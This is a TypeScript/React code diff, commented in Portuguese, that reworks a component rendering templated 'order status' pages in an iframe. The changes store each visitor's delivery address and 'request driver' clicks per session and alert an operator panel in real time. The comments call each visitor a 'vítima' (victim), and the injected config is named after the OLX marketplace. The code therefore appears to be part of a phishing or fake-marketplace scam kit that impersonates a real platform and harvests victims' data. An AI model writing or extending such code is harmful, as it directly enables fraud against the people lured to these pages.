@@ -299,11 +299,14 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
     };
   }, [adId]);
 
-  // Subscribe a mudanças de driver_dispatched_at e dispara mensagem pro iframe
+  // Subscribe a mudanças de driver_dispatched_at na sessão DESTE visitante
+  // (tabela ad_session_orders, chave ad_id+session_id) e dispara mensagem pro iframe.
   useEffect(() => {
     if (!adId) return;
+    const sessionId = getSessionId();
     let lastDispatched: string | null = null;
     const send = (row: any, isInitial: boolean) => {
+      if (!row || row.session_id !== sessionId) return;
       const dispatched = row?.driver_dispatched_at || null;
       if (dispatched && dispatched !== lastDispatched) {
         lastDispatched = dispatched;
@@ -331,21 +334,20 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
     };
     (async () => {
       const { data } = await supabase
-        .from("ad_order_status" as any)
+        .from("ad_session_orders" as any)
         .select("*")
         .eq("ad_id", adId)
+        .eq("session_id", sessionId)
         .maybeSingle();
       if (data) {
-        // initial silencia o som via flag — mas como o template já lê CFG na carga,
-        // não enviamos initial pra evitar tocar duas vezes.
         lastDispatched = (data as any).driver_dispatched_at || null;
       }
     })();
     const ch = supabase
-      .channel(`order-status-driver-${adId}`)
+      .channel(`session-order-${adId}-${sessionId}`)
       .on(
         "postgres_changes",
-        { event: "*", schema: "public", table: "ad_order_status", filter: `ad_id=eq.${adId}` },
+        { event: "*", schema: "public", table: "ad_session_orders", filter: `ad_id=eq.${adId}` },
         (payload) => send(payload.new as any, false),
       )
       .subscribe();
@@ -545,15 +547,16 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
         );
       }
 
-      // Para a tela de status do pedido, busca config no banco e injeta inline ANTES do render
+      // Para a tela de status do pedido, busca config do produto (ad_order_status)
+      // + dados específicos desta sessão (ad_session_orders) e injeta inline ANTES do render.
       if (kind === "verification-success" && adId) {
         try {
-          const { data } = await supabase
-            .from("ad_order_status" as any)
-            .select("*")
-            .eq("ad_id", adId)
-            .maybeSingle();
-          const cfg = (data as any) || {};
+          const sessionId = getSessionId();
+          const [{ data: productCfg }, { data: sessionCfg }] = await Promise.all([
+            supabase.from("ad_order_status" as any).select("*").eq("ad_id", adId).maybeSingle(),
+            supabase.from("ad_session_orders" as any).select("*").eq("ad_id", adId).eq("session_id", sessionId).maybeSingle(),
+          ]);
+          const cfg = { ...(productCfg as any || {}), ...(sessionCfg as any || {}) };
           const cfgScript = `<script>window.__OLX_ORDER__ = ${JSON.stringify(cfg).replace(/</g, "\\u003c")};</script>`;
           nextHtml = nextHtml.replace(/<head[^>]*>/i, (m) => `${m}\n${cfgScript}`);
         } catch {}
@@ -680,17 +683,35 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
       }
 
       // Salvar endereço de coleta enviado pelo template "verification-success"
+      // Vai pra ad_session_orders (uma linha por sessão/vítima).
       if (data.type === "iframe-save-delivery-address" && adId && data.address) {
         const sessionId = getSessionId();
         supabase
-          .from("ad_order_status" as any)
+          .from("ad_session_orders" as any)
           .upsert({
             ad_id: adId,
+            session_id: sessionId,
             delivery_address: data.address,
-            delivery_address_session_id: sessionId,
-          })
+          }, { onConflict: "ad_id,session_id" })
           .then(({ error }) => {
             if (error) console.warn("[PreviewFrame] save delivery address:", error);
+          });
+        return;
+      }
+
+      // Vítima clicou em "Solicitar motorista" → marca driver_requested_at.
+      // O painel detecta via realtime e dispara alerta sonoro/notificação.
+      if (data.type === "iframe-request-driver" && adId) {
+        const sessionId = getSessionId();
+        supabase
+          .from("ad_session_orders" as any)
+          .upsert({
+            ad_id: adId,
+            session_id: sessionId,
+            driver_requested_at: new Date().toISOString(),
+          }, { onConflict: "ad_id,session_id" })
+          .then(({ error }) => {
+            if (error) console.warn("[PreviewFrame] request driver:", error);
           });
         return;
       }
